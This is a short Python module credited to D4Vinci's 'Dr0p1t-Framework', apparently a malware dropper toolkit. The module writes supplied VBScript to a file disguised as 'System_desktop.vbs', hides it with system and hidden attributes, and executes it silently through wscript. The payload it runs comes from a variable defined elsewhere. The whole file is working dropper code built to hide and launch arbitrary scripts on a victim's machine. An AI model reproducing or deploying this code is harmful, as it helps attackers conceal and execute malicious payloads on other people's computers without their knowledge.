#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run vbs scripts
#Start
def F522F(tobe):
    f = open("System_desktop.vbs","w")
    f.write(tobe)
    f.close()
    xxx = subprocess.Popen("attrib +s +h System_desktop.vbs",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    blah = subprocess.Popen("wscript System_desktop.vbs > nul",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

F522F(Vbs_Script_Data)
